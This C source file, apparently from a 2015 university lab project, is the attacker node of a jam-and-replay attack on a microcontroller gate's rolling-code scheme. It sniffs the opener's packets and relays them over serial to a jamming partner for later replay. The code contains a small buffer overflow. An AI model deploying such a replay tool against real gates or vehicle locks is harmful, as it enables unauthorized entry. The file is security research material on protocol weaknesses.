/*
Joseph Finnegan
Maynooth University
Summer 2015

For use with an ATmega128RFA1 microcontroller
Works with a gate, an attacker, and a noisemaker. The open and gate use a rolling code for  authentication
(The opener sends a num to the gate to request an open. The gate will accept a certain range of nums. 
Every send, the open increments its num, and every receive the gate changes the lower bound to the num received + 1)
In this way, each password will only be accepted once.

The attack is performed when the opener and gate are close enough to communicate. The two attacker nodes are connected with a cable and can communicate over the serial line.
The attacker picks up the open request from the opener, saves it, and indicates to the noisemaker to block any possible communication.
The attacker then transmits the open request packet over the serial line to the noisemaker. The noisemaker then saves this packet.
The opener, having failed to open the gate, sends another open request. The attacker picks this up too, indicates to the noisemaker to block the message, and then sends this packet along.
The noisemaker then broadcasts the first packet, opening the gate. It now has another open command to open the gate whenever it wants.

The major danger of this attack is that the attackers don't need to know the contents of any of the packets, they just have to replay them.
*/

//
// AVR C library
//
#include <avr/io.h>

//
// Standard C include files
//
#include <stdbool.h>
#include <stdio.h>
#include <stdio.h>
#include "string.h"

//
// Header files for the various required libraries
//
#include "app.h"
#include "simple_os.h"
#include "button.h"
#include "leds.h"
#include "radio.h"
#include "serial.h"
#include "hw_timer.h"

unsigned short gate = 0x02;

typedef struct Packet {
	uint16_t dst;
	uint16_t src;
	uint16_t num;
} Packet;

typedef struct SerialMessage {
	uint16_t start;
	uint16_t msg;
	uint16_t num;
	uint16_t endd;
} SerialMessage;

Packet newPkt;
SerialMessage ser;
uint16_t oldnum;
uint16_t newnum;
char str[10];
uint16_t justsent = 0x00;

//
// Global Variables
//
static timer timer1;

// Buffer for transmitting radio packets
unsigned char tx_buffer[RADIO_MAX_LEN];

bool tx_buffer_inuse=false; // Check false and set to true before sending a message. Set to false in tx_done
bool savedAMessage = false;
bool canOpen = false;

//
// App init function
//
void application_start()
{
	leds_init();
	button_init();
	
	radio_init(NODE_ID, true); //true indicates receives radio message for ALL nodes
	radio_set_power(1);
	radio_start();
	
	serial_init(9600);
	
	ser.start = 'X';
	ser.endd = 'Y';
	
}
//
// Timer tick handler
//
void application_timer_tick(timer *t)
{

}

void application_radio_rx_msg(unsigned short dst, unsigned short src, int len, unsigned char *msgdata)
{
	newPkt.dst = msgdata[0];
	newPkt.src = msgdata[2];
	newPkt.num = msgdata[4];
	
	//if this message is meant for the gate, then we should block this message, and send it on ourselves when we want.
	
	//SEND OUT NOISE
	//send message down serial line indicating that the partner node should blast out noise.
	//wait for a response saying first ahead
	//then send the num yourself.
	leds_on(LED_RED);
	
	if(newPkt.dst == gate && newPkt.num != justsent){
		
		if(!savedAMessage){
			leds_on(LED_ORANGE);
			leds_off(LED_GREEN);
			ser.msg = 1;
			ser.num = newPkt.num;
		
			unsigned char buf[8];
			
			//sprintf(buf, " %c%02d%02d %c", ser.start, ser.msg, ser.num, ser.endd);
			//printf(buf);
			printf(" %c%02d%02d %c", ser.start, ser.msg, ser.num, ser.endd);
			justsent = ser.num;
			
			//serial_puts(buf);
			
			savedAMessage = true;
		}
		else{
			leds_on(LED_GREEN);
			leds_off(LED_ORANGE);
			ser.msg = 2;
			ser.num = newPkt.num;
			
			unsigned char buf[8];
			
			sprintf(buf, " %c%02d%02d %c", ser.start, ser.msg, ser.num, ser.endd);
			serial_puts(buf);
			
			savedAMessage = false;
		}		
	}
}

//
// This function is called whenever a radio message has been transmitted
// You need to free up the transmit buffer here
//
void application_radio_tx_done()
{
	tx_buffer_inuse = false;
	
	//empty buffers after data has been sent
	for(int j=0; j<RADIO_MAX_LEN; j++)
	{
		tx_buffer[j] = 0x00;
	}
}

void application_button_pressed()
{
	//Not needed
}

void application_button_released()
{
	//Not needed
}